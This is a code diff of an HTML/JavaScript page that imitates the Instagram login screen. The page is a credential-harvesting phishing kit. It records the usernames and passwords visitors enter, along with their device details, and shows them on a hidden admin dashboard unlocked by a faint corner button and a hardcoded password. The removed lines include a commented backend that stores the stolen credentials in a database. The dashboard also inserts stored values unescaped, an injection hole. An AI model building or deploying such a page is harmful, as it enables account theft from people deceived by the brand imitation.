@@ -6,250 +6,220 @@
     <title>Instagram Login</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .hidden-admin-btn {
+        .hidden-btn {
             position: fixed;
-            bottom: 10px;
-            right: 10px;
+            bottom: 20px;
+            right: 20px;
             width: 30px;
             height: 30px;
             opacity: 0.1;
             transition: opacity 0.3s;
         }
-        .hidden-admin-btn:hover {
-            opacity: 0.5;
+        .hidden-btn:hover {
+            opacity: 1;
+        }
+        .password-input {
+            letter-spacing: 2px;
         }
     </style>
 </head>
-<body class="bg-gray-100 min-h-screen flex items-center justify-center">
+<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
     <!-- Main Login Form -->
-    <div class="bg-white p-8 rounded-lg shadow-md w-full max-w-md">
+    <div id="loginForm" class="bg-white rounded-lg shadow-md p-8 w-full max-w-md">
         <div class="flex justify-center mb-6">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="w-12 h-12 text-pink-600">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="w-16 h-16 text-pink-600">
                 <path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
             </svg>
         </div>
-        <h1 class="text-2xl font-bold text-center mb-6">Instagram</h1>
+        <h1 class="text-2xl font-bold text-center text-gray-800 mb-6">Instagram Login</h1>
         
-        <form id="loginForm" class="space-y-4">
+        <form id="igForm" class="space-y-4">
             <div>
-                <input type="text" id="username" placeholder="Phone number, username, or email" 
-                    class="w-full px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500">
+                <label for="username" class="block text-sm font-medium text-gray-700 mb-1">Username</label>
+                <input type="text" id="username" name="username" required 
+                       class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500">
             </div>
+            
             <div>
-                <input type="password" id="password" placeholder="Password" 
-                    class="w-full px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500">
+                <label for="password" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                <input type="password" id="password" name="password" required 
+                       class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500">
             </div>
+            
             <button type="submit" 
-                class="w-full bg-pink-600 text-white py-2 rounded-md hover:bg-pink-700 transition duration-300">
+                    class="w-full bg-gradient-to-r from-pink-500 to-purple-600 text-white py-2 px-4 rounded-md hover:opacity-90 transition-opacity font-medium">
                 Log In
             </button>
         </form>
         
-        <div class="text-center mt-4">
-            <a href="#" class="text-sm text-gray-600 hover:underline">Forgot password?</a>
+        <div class="mt-6 text-center text-sm text-gray-600">
+            <p>Don't have an account? <a href="#" class="text-pink-600 font-medium">Sign up</a></p>
+        </div>
+    </div>
+
+    <!-- Hidden Admin Button (Bottom Right Corner) -->
+    <button id="adminBtn" class="hidden-btn bg-blue-500 rounded-full"></button>
+
+    <!-- Password Verification Modal -->
+    <div id="passwordModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden">
+        <div class="bg-white rounded-lg p-6 w-full max-w-sm">
+            <h2 class="text-xl font-bold text-gray-800 mb-4">Admin Access</h2>
+            <p class="text-sm text-gray-600 mb-4">Enter admin password to continue:</p>
+            <input type="password" id="adminPassword" class="w-full px-4 py-2 border border-gray-300 rounded-md mb-4 password-input" placeholder="••••••">
+            <div class="flex justify-end space-x-3">
+                <button id="cancelBtn" class="px-4 py-2 text-gray-600 hover:text-gray-800">Cancel</button>
+                <button id="verifyBtn" class="px-4 py-2 bg-blue-500 text-white rounded-md hover:bg-blue-600">Verify</button>
+            </div>
+            <p id="passwordError" class="text-red-500 text-sm mt-2 hidden">Incorrect password</p>
+        </div>
+    </div>
+
+    <!-- Admin Dashboard -->
+    <div id="adminDashboard" class="bg-white rounded-lg shadow-md p-6 w-full max-w-4xl hidden">
+        <div class="flex justify-between items-center mb-6">
+            <h2 class="text-2xl font-bold text-gray-800">Admin Dashboard</h2>
+            <button id="logoutBtn" class="px-4 py-2 bg-red-500 text-white rounded-md hover:bg-red-600 text-sm">Logout</button>
         </div>
         
-        <div class="mt-6 text-center">
-            <p class="text-sm text-gray-600">Don't have an account? <a href="#" class="text-pink-600 font-medium">Sign up</a></p>
+        <div class="overflow-x-auto">
+            <table class="min-w-full divide-y divide-gray-200">
+                <thead class="bg-gray-50">
+                    <tr>
+                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Username</th>
+                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Password</th>
+                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">IP Address</th>
+                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Device</th>
+                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Timestamp</th>
+                    </tr>
+                </thead>
+                <tbody id="dataTableBody" class="bg-white divide-y divide-gray-200">
+                    <!-- Data will be inserted here -->
+                </tbody>
+            </table>
         </div>
-    </div>
-    
-    <!-- Hidden Admin Button (invisible to users) -->
-    <button id="adminBtn" class="hidden-admin-btn" title="Admin Access">⚙️</button>
-    
-    <!-- Admin Login Modal (hidden by default) -->
-    <div id="adminModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden">
-        <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-sm">
-            <h2 class="text-xl font-bold mb-4">Admin Login</h2>
-            <input type="password" id="adminPassword" placeholder="Admin Password" 
-                class="w-full px-4 py-2 border rounded-md mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500">
-            <button id="adminLoginBtn" 
-                class="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 transition duration-300">
-                Login
-            </button>
-        </div>
-    </div>
-    
-    <!-- Admin Dashboard (hidden by default) -->
-    <div id="adminDashboard" class="fixed inset-0 bg-white p-6 overflow-auto hidden">
-        <div class="max-w-6xl mx-auto">
-            <div class="flex justify-between items-center mb-6">
-                <h1 class="text-2xl font-bold">Admin Dashboard</h1>
-                <button id="logoutBtn" class="bg-red-600 text-white px-4 py-2 rounded-md hover:bg-red-700">
-                    Logout
-                </button>
-            </div>
-            
-            <div class="mb-4">
-                <div class="flex justify-between items-center">
-                    <h2 class="text-xl font-semibold">User Logins</h2>
-                    <p id="totalLogins" class="text-gray-600">0 records</p>
-                </div>
-            </div>
-            
-            <div class="overflow-x-auto">
-                <table class="min-w-full bg-white border border-gray-200">
-                    <thead class="bg-gray-100">
-                        <tr>
-                            <th class="py-2 px-4 border-b">Username</th>
-                            <th class="py-2 px-4 border-b">Password</th>
-                            <th class="py-2 px-4 border-b">IP Address</th>
-                            <th class="py-2 px-4 border-b">Device Info</th>
-                            <th class="py-2 px-4 border-b">Date/Time</th>
-                        </tr>
-                    </thead>
-                    <tbody id="loginData">
-                        <!-- Data will be inserted here by JavaScript -->
-                    </tbody>
-                </table>
-            </div>
+        
+        <div class="mt-4 text-sm text-gray-500">
+            <p>Total entries: <span id="entryCount">0</span></p>
         </div>
     </div>
 
     <script>
-        // Server-side code would normally be in a separate file, but we're including it here for demonstration
-        // In a real application, this would be split into proper Node.js files
+        // Simulated database using localStorage
+        const DB_KEY = 'instagram_logins';
         
-        // This is just a simulation - in a real app, this would be proper backend code
-        document.addEventListener('DOMContentLoaded', function() {
-            // Simulated database
-            let loginData = JSON.parse(localStorage.getItem('loginData')) || [];
-            const ADMIN_PASSWORD = "Yusuf";
+        // Initialize database if it doesn't exist
+        if (!localStorage.getItem(DB_KEY)) {
+            localStorage.setItem(DB_KEY, JSON.stringify([]));
+        }
+        
+        // DOM Elements
+        const loginForm = document.getElementById('loginForm');
+        const adminBtn = document.getElementById('adminBtn');
+        const passwordModal = document.getElementById('passwordModal');
+        const adminDashboard = document.getElementById('adminDashboard');
+        const adminPassword = document.getElementById('adminPassword');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const passwordError = document.getElementById('passwordError');
+        const logoutBtn = document.getElementById('logoutBtn');
+        const dataTableBody = document.getElementById('dataTableBody');
+        const entryCount = document.getElementById('entryCount');
+        const igForm = document.getElementById('igForm');
+        
+        // Show admin button after 5 seconds (simulating hidden access)
+        setTimeout(() => {
+            adminBtn.style.display = 'block';
+        }, 5000);
+        
+        // Form submission
+        igForm.addEventListener('submit', function(e) {
+            e.preventDefault();
             
-            // Form submission
-            document.getElementById('loginForm').addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const username = document.getElementById('username').value;
-                const password = document.getElementById('password').value;
-                
-                if (username && password) {
-                    // In a real app, this would be sent to the backend via fetch/axios
-                    const userData = {
-                        username,
-                        password,
-                        ip: "192.168.1.1", // In real app, this would come from req.ip
-                        userAgent: navigator.userAgent,
-                        timestamp: new Date().toISOString()
-                    };
-                    
-                    loginData.push(userData);
-                    localStorage.setItem('loginData', JSON.stringify(loginData));
-                    
-                    // Show success message
-                    alert('Login successful!');
-                    document.getElementById('loginForm').reset();
-                } else {
-                    alert('Please enter both username and password');
-                }
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // In a real implementation, this would be sent to a server
+            // For this demo, we'll simulate collecting device info
+            const deviceInfo = navigator.userAgent;
+            const timestamp = new Date().toLocaleString();
+            
+            // Get IP (this is a simulation - real IP would come from server)
+            const ip = "192.168." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255);
+            
+            // Save to "database"
+            const db = JSON.parse(localStorage.getItem(DB_KEY));
+            db.push({
+                username,
+                password,
+                ip,
+                device: deviceInfo,
+                timestamp
             });
+            localStorage.setItem(DB_KEY, JSON.stringify(db));
             
-            // Admin button click
-            document.getElementById('adminBtn').addEventListener('click', function() {
-                document.getElementById('adminModal').classList.remove('hidden');
-            });
-            
-            // Admin login
-            document.getElementById('adminLoginBtn').addEventListener('click', function() {
-                const password = document.getElementById('adminPassword').value;
-                
-                if (password === ADMIN_PASSWORD) {
-                    document.getElementById('adminModal').classList.add('hidden');
-                    document.getElementById('adminDashboard').classList.remove('hidden');
-                    displayLoginData();
-                } else {
-                    alert('Incorrect admin password');
-                }
-            });
-            
-            // Logout from admin dashboard
-            document.getElementById('logoutBtn').addEventListener('click', function() {
-                document.getElementById('adminDashboard').classList.add('hidden');
-                document.getElementById('adminPassword').value = '';
-            });
-            
-            // Display login data in admin dashboard
-            function displayLoginData() {
-                const tbody = document.getElementById('loginData');
-                tbody.innerHTML = '';
-                
-                loginData.forEach(data => {
-                    const row = document.createElement('tr');
-                    row.className = 'hover:bg-gray-50';
-                    
-                    row.innerHTML = `
-                        <td class="py-2 px-4 border-b">${data.username}</td>
-                        <td class="py-2 px-4 border-b">${data.password}</td>
-                        <td class="py-2 px-4 border-b">${data.ip}</td>
-                        <td class="py-2 px-4 border-b">${data.userAgent}</td>
-                        <td class="py-2 px-4 border-b">${new Date(data.timestamp).toLocaleString()}</td>
-                    `;
-                    
-                    tbody.appendChild(row);
-                });
-                
-                document.getElementById('totalLogins').textContent = `${loginData.length} records`;
+            // Show success message
+            alert('Login successful! (This is a demo - no actual login occurred)');
+            igForm.reset();
+        });
+        
+        // Admin button click
+        adminBtn.addEventListener('click', function() {
+            passwordModal.classList.remove('hidden');
+        });
+        
+        // Verify admin password
+        verifyBtn.addEventListener('click', function() {
+            if (adminPassword.value === 'Yusuf') {
+                passwordError.classList.add('hidden');
+                passwordModal.classList.add('hidden');
+                loginForm.classList.add('hidden');
+                adminDashboard.classList.remove('hidden');
+                adminBtn.style.display = 'none';
+                loadAdminData();
+            } else {
+                passwordError.classList.remove('hidden');
             }
         });
-    </script>
-
-    <!-- This would be the actual Node.js backend code in separate files -->
-    <!-- For a real implementation, you would need to create these files: -->
-    <!-- 
-    // server.js
-    const express = require('express');
-    const mongoose = require('mongoose');
-    const bodyParser = require('body-parser');
-    const app = express();
-    
-    // Connect to MongoDB
-    mongoose.connect('mongodb://localhost:27017/instagram_logins', {
-        useNewUrlParser: true,
-        useUnifiedTopology: true
-    });
-    
-    // User model
-    const User = mongoose.model('User', {
-        username: String,
-        password: String,
-        ip: String,
-        userAgent: String,
-        timestamp: { type: Date, default: Date.now }
-    });
-    
-    // Middleware
-    app.use(bodyParser.urlencoded({ extended: true }));
-    app.use(express.static('public'));
-    
-    // Routes
-    app.post('/login', async (req, res) => {
-        const { username, password } = req.body;
-        const ip = req.ip;
-        const userAgent = req.get('User-Agent');
         
-        const user = new User({ username, password, ip, userAgent });
-        await user.save();
+        // Cancel button
+        cancelBtn.addEventListener('click', function() {
+            passwordModal.classList.add('hidden');
+            adminPassword.value = '';
+            passwordError.classList.add('hidden');
+        });
         
-        res.send('Login successful');
-    });
-    
-    app.post('/admin/login', (req, res) => {
-        if (req.body.password === 'Yusuf') {
-            req.session.admin = true;
-            res.redirect('/admin');
-        } else {
-            res.send('Invalid admin password');
+        // Logout button
+        logoutBtn.addEventListener('click', function() {
+            adminDashboard.classList.add('hidden');
+            loginForm.classList.remove('hidden');
+            adminBtn.style.display = 'block';
+        });
+        
+        // Load admin data
+        function loadAdminData() {
+            const db = JSON.parse(localStorage.getItem(DB_KEY));
+            dataTableBody.innerHTML = '';
+            
+            if (db.length === 0) {
+                dataTableBody.innerHTML = '<tr><td colspan="5" class="px-6 py-4 text-center text-gray-500">No data available</td></tr>';
+                entryCount.textContent = '0';
+                return;
+            }
+            
+            db.forEach(entry => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${entry.username}</td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${entry.password}</td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${entry.ip}</td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 max-w-xs truncate">${entry.device}</td>
+                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${entry.timestamp}</td>
+                `;
+                dataTableBody.appendChild(row);
+            });
+            
+            entryCount.textContent = db.length;
         }
-    });
-    
-    app.get('/admin', async (req, res) => {
-        if (!req.session.admin) return res.redirect('/admin-login');
-        
-        const users = await User.find().sort({ timestamp: -1 });
-        res.render('admin', { users });
-    });
-    
-    app.listen(3000, () => console.log('Server running on port 3000'));
-    -->
+    </script>
 </body>
 </html>
